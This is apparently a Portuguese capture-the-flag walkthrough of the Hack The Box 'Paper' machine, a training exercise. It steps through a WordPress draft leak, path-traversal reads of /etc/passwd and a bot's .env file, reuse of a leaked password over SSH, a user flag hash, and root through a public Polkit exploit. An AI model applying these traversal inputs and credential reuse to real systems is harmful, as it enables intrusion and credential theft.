HTB - PAPER - CTF

1- Conectar com a VPN e o lab do HTB

2- Iniciar a máquina para receber o IP

3- Acessar o IP no navegador, para começar a analisar 

![img1](https://user-images.githubusercontent.com/61808567/179632716-44ea6808-128c-4d65-802c-cc4b1af24172.png)


Apenas uma página estática

​	4- Utilizar o nmap para encontrar portas e serviços

​			nmap -sV IP

O -sV deixa você saber a versão do servidor. É importante saber a versão, pois algumas são exploráveis e outras não.

FTP - permite a transferência de arquivos para um servidor e também baixar arquivos de um servidor

SSH - permite a conexão com o terminal no servidor para ser capaz de realizar comandos e controlar qualquer servidor conectado

Resultado do nmap:

![img2](https://user-images.githubusercontent.com/61808567/179632782-9d6639fd-205c-48b5-bf16-c8e0dc384eef.png)


Vamos utilizar o Gobuster para ver quais diretórios estão disponíveis.

![img3](https://user-images.githubusercontent.com/61808567/179632803-72b6ee70-674a-4b1f-b719-e2ea7f575291.png)


![img4](https://user-images.githubusercontent.com/61808567/179632814-3bc0fab5-4ab9-4fe7-821a-d3dc8702b79c.png)


Não obtivemos nenhuma resposta para isso. Sem diretórios disponíveis e apenas sabemos as portas abertas.

Para tentar saber mais informações, vamos tentar usar o comendo curl -I 10.10.11.143 para saber mais especificações do IP (curl - Client URL, verificar a conectividade da URL e transferência de dados)

![img5](https://user-images.githubusercontent.com/61808567/179632865-fba80dee-c90f-4627-8f32-f9299ba5df30.png)

Tivemos algum retorno positivo: Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
X-Backend-Server: office.paper

As duas informações são interessantes. Saber a versão do software e o 'office.paper' pode ser analisado no navegador. Para que isso funcione, precisamos adicionar essas informações em /etc/host

No terminal: sudo nano /etc/hosts

sudo vim /etc/hosts para conferir se realmente foi adicionado

Vamos acessar o office.paper e para isso precisamos adicionar um ?static=1 após a url:

http://office.paper/?static=1

![img6](https://user-images.githubusercontent.com/61808567/179632887-c88e4dca-b9c6-4b35-ba0a-d9e4c2e22a2c.png)


Conseguimos encontrar uma nova página.

​	Logo abaixo na página, encontramos algumas mensagens:

![img7](https://user-images.githubusercontent.com/61808567/179632898-9d551b98-c213-46fb-8da9-85caf421a28c.png)


Observando o código fonte da página nós podemos perceber que o site foi feito usando WordPress:

![img8](https://user-images.githubusercontent.com/61808567/179632914-d0b71c87-e0b9-4358-82a0-87cc61995987.png)

Clicar com o botão direito e ir em "View Page Info" para saber a versão: WordPress 5.2.3

![img9](https://user-images.githubusercontent.com/61808567/179632933-d6805197-5301-46e6-bf01-0c101482bba7.png)

![img10](https://user-images.githubusercontent.com/61808567/179632955-d2d30d8b-0e91-4cee-ad24-ed5698c83a1f.png)

Agora, sabendo a versão, vamos pesquisar vulnerabilidades no WordPress 5.2.3 No site https://wpscan.com/wordpress/523 vamos pesquisar por algo relacionado a postagens, comentários, publicações de usuários. https://wpscan.com/vulnerability/9909 Há uma vulnerabilidade que deixa qualquer usuário ver publicações privadas ou que ainda não foram ou nem vão ser publicadas apenas ao adicionar o ?static=1. Como já estamos com o ?static=1 adicionado, vamos analisar o link do chat apresentado na página. Para que possamos abrir o link é necessário adicionar no /etc/host

Após isso, vamos criar uma conta no chat e entrar e 'General'. Vamos explorar o chat e tentar encontrar algo.
![img11](https://user-images.githubusercontent.com/61808567/179632981-31bba774-3fe7-4d6c-ac2a-04e3ab42493a.png)
![img12](https://user-images.githubusercontent.com/61808567/179632992-84299bce-5b0c-4f08-8f10-a101983c632c.png)
![img13](https://user-images.githubusercontent.com/61808567/179633000-01bdb6a8-8005-4e65-bbba-090f8a94bb18.png)

'recyclops' é um bot que permite que a gente mande mensagens diretas ao clicar nele e depois clicar no ícone de mensagem, ou seja, ele permite Local File Inclusion (que seria a inclusão de um arquivo via parâmetro **GET** e não faz o devido tratamento da entrada do usuário, permitindo assim que ele inclua qualquer arquivo do sistema.)

![img14](https://user-images.githubusercontent.com/61808567/179633025-61e4518e-3479-4c0f-bf70-061e86d29cee.png)
![img15](https://user-images.githubusercontent.com/61808567/179633041-afaa1104-393d-423f-b63c-c0aac438b7d1.png)
![img16](https://user-images.githubusercontent.com/61808567/179633048-015cd948-646d-4392-83c9-29e76146804a.png)

Como temos o chat do bot aberto, vamos testar e ver se ele aceita alguns comandos:

ls (não recomhece)

![img17](https://user-images.githubusercontent.com/61808567/179633074-dbf0bd64-eaf9-43e6-a18f-48b017666358.png)


Como ele permite o LFI, vamos testar o comendo 'file'

![img18](https://user-images.githubusercontent.com/61808567/179633096-687b3ea4-dd31-4002-8197-0edbe22096a0.png)

list (obtemos resposta):

![img19](https://user-images.githubusercontent.com/61808567/179633113-3df5e64a-6aa9-41b3-84c7-95a22248b931.png)

etching the directory listing of /sales/  (algo relacionado ao diretório 'sales')
total 0
drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 .
drwx------ 11 dwight dwight 281 Feb 6 07:46 ..
drwxr-xr-x 2 dwight dwight 27 Sep 15 2021 sale
drwxr-xr-x 2 dwight dwight 27 Jul 3 2021 sale_2

Vamos explorar mais o uso do 'list' para tentar obter mais informações:

list .

![img20](https://user-images.githubusercontent.com/61808567/179633132-992bc4d0-80dd-402f-a72d-8b194d691d56.png)

list ..

![img21](https://user-images.githubusercontent.com/61808567/179633145-6d27e168-c41a-4b21-97bd-e5162fee4df3.png)


list ../

![img22](https://user-images.githubusercontent.com/61808567/179633159-81091ca7-24a2-49ad-b83f-b86f940f8770.png)


E temos bons resultados. Agora, com essas informações será importante usar o 'file'

file ../user.txt  e nosso acesso foi negado...
![img23](https://user-images.githubusercontent.com/61808567/179633183-626290f6-c36e-421f-ae98-e0af17d8f280.png)


list ../hubot  temos algum resultado. Analisando o que apareceu ao realizar essa consulta, percebemos que há um arquivo com extensões: .env; .git; .log

![img24](https://user-images.githubusercontent.com/61808567/179633207-bcb0cd0a-2d0e-4380-9532-0267f0754cb4.png)


.env = https://blog.rocketseat.com.br/variaveis-ambiente-nodejs/

![img25](https://user-images.githubusercontent.com/61808567/179633218-d2a27bea-abef-4323-b001-b69d02e3c647.png)


Essa é a ferramenta utilizada para orquestrar as variáveis ambiente de um projeto. O nome dela sugere o arquivo em que as informações ficarão, `dot` que é ponto em inglês acrescido de `env`, então temos o arquivo `.env` que é composto de chaves e valores.

Uma curiosidade é que em sistemas baseados em **unix** arquivos que iniciam com `.` são ocultos, talvez seja uma sugestão da tarefa desse arquivo.

"ARQUIVOS OCULTOS" - algo interessante para a jornada. Vamos adicionar o .env na pesquisa do bot e ver o que acontece.

file ../hubot/.env

![img26](https://user-images.githubusercontent.com/61808567/179633227-4f33164e-3a75-4d53-98eb-5bcdaffd2ac2.png)


TEMOS UM NOME DE USUÁRIO E UMA SENHA!

 <!=====Contents of file ../hubot/.env=====>
export ROCKETCHAT_URL='http://127.0.0.1:48320'
export ROCKETCHAT_USER=recyclops
export ROCKETCHAT_PASSWORD=Queenofblad3s!23
export ROCKETCHAT_USESSL=false
export RESPOND_TO_DM=true
export RESPOND_TO_EDITED=true
export PORT=8000
export BIND_ADDRESS=127.0.0.1
<!=====End of file ../hubot/.env=====>

Vamos utilizar de mais alguns comandos no bot para tentar achar um usuário real.

file ../../../etc/passwd

![img27](https://user-images.githubusercontent.com/61808567/179633249-81acb27d-87c4-4ca7-935d-91198f040c0d.png)


/etc/passwd = 

dwight❌1004:1004::/home/dwight:/bin/bash (tem acesso ao /bin/bash) (obs: quando estavamos testando o 'list' ali pra cima, o dwight apareceu, easter egg?)

/bin/bash =  determina quem pode acessar o sistema e o que eles podem fazer dentro dele.

Podemos tentar entrar no sistema com essa informação utilizando ssh:

ssh = "O SSH é um protocolo que garante que cliente e servidor remoto troquem informações de maneira segura e dinâmica. O processo é capaz de criptografar os arquivos enviados ao diretório do servidor, garantindo que alterações e o envio de dados sejam realizados da melhor forma."

ssh dwight@10.10.11.143

Pronto! Vamos usar a senha encontrada para entrar no sistema. Eeeee estamos dentro do sistema.

![img28](https://user-images.githubusercontent.com/61808567/179633363-5c0199a1-f47f-4b0e-b4ad-967be2848a9f.png)


ls e vamos explorar os arquivos.

cat user.txt

![img29](https://user-images.githubusercontent.com/61808567/179633377-912c8c9a-c036-4e2c-bf58-d4405c7bf4fa.png)

User flag: a1420ecdcce4046936751b79f8d95adb

PRIVILEGE ESCALATION = vamos escalar privilégios para poder entrar no sistema como root

Linpeas = Linux Local Privilege Escalation. Um script que busca por possíveis arquivos para escalar privilégios

Vamos rodar o Linpeas e checar se tem alguma vulnerabilidade:

Primeiro vamos clonar o repositório do Linpeas: 

git clone https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

Após isso, vamos rodar: sh linpeas.sh

![img30](https://user-images.githubusercontent.com/61808567/179633397-7edd3bce-b7e0-4e0c-86e3-1baab8fbf241.png)


Após rodar o linpeas, notamos que apareceram algumas vulnerabilidades possíveis, e a primeira foi:

![img31](https://user-images.githubusercontent.com/61808567/179633415-f79663ed-12bc-4902-851c-1311ea23d424.png)


Pesquisando sobre a cve-2021-4034. Pesquisando sobre, percebemos que é uma vulnerabilidade de Pwnkit ou Polkit, que permite que usuários que não tem privilégios, executem certos comandos usando DBus (sistema de comunicação entre aplicações).

Um atacante com um usuário comum obtenha privilégios de root no sistema.

Pesquisando alguns scripts relacionados a essa cve para poder usar e "pegar o root", encontramos:

https://github.com/Almorabea/Polkit-exploit/blob/main/CVE-2021-3560.py

Vamos criar um arquivo e copiar o código desse link:

nano exploit.py

![img32](https://user-images.githubusercontent.com/61808567/179633440-2b0aeddc-218e-4a21-9fcb-7f5a16d8e085.png)


E... somos ROOT!

![img33](https://user-images.githubusercontent.com/61808567/179633454-e150267a-0328-435e-8c72-336989700547.png)
![img34](https://user-images.githubusercontent.com/61808567/179633461-7f265fe5-e460-401e-9840-8b56c274d5e2.png)
![img35](https://user-images.githubusercontent.com/61808567/179633467-f59ed281-f5ae-4bd6-abb2-c5e19ffe4843.png)


Flag root encontrada

Temos as 2 flags :)
